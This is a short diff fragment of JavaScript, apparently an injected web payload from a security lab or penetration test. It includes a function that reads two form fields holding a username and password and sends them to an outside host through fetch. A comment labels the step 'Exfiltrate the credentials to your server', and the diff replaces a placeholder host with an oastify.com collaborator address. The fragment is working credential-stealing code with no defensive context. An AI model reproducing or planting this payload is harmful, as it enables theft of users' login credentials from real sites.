@@ -51,7 +51,7 @@ setTimeout(function () {
     function f() {
       if(b.value.length > 0) {
         // Exfiltrate the credentials to your server
-        fetch('http://yourserver.com/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
+        fetch('http://0uvbq8lc8irgn8bfeeopwlwcy34usrgg.oastify.com/' + encodeURIComponent(a.value) + '&password=' + encodeURIComponent(b.value));
       }
     }
 
